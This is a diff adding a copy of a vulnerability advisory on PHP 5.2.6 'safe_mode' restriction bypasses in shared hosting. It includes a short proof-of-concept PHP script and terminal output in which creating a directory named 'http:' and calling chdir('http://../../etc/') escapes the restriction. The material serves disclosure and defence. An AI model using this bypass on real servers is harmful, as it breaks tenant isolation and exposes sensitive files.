@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/29796/info
+
+PHP is prone to multiple 'safe_mode' restriction-bypass vulnerabilities. Successful exploits could allow an attacker to determine the presence of files in unauthorized locations; other attacks are also possible.
+
+Exploiting these issues allows attackers to obtain sensitive data that could be used in other attacks.
+
+These vulnerabilities would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' restriction is expected to isolate users from each other.
+
+PHP 5.2.6 is vulnerable; other versions may also be affected. 
+
+cxib# cat /www/wufff.php
+<?
+echo getcwd()."\n";
+chdir("/etc/");
+echo getcwd()."\n";
+?>
+cxib# ls -la /www/wufff.php
+-rw-r--r--  1 www  www  62 Jun 17 17:14 /www/wufff.php
+cxib# php /www/wufff.php
+/www
+
+Warning: chdir(): SAFE MODE Restriction in effect.  The script whose uid
+is 80 is not allowed to access /etc/ owned by uid 0 in /www/wufff.php on
+line 3
+/www
+cxib#
+---/EXAMPLE1---
+
+---EXAMPLE2---
+cxib# ls -la /www/wufff.php
+-rw-r--r--  1 www  www  74 Jun 17 17:13 /www/wufff.php
+cxib# ls -la /www/http:
+total 8
+drwxr-xr-x   2 www  www   512 Jun 17 17:12 .
+drwxr-xr-x  19 www  www  4608 Jun 17 17:13 ..
+cxib# cat /www/wufff.php
+<?
+echo getcwd()."\n";
+chdir("http://../../etc/");
+echo getcwd()."\n";
+?>
+cxib# php /www/wufff.php
+/www
+/etc
+cxib#
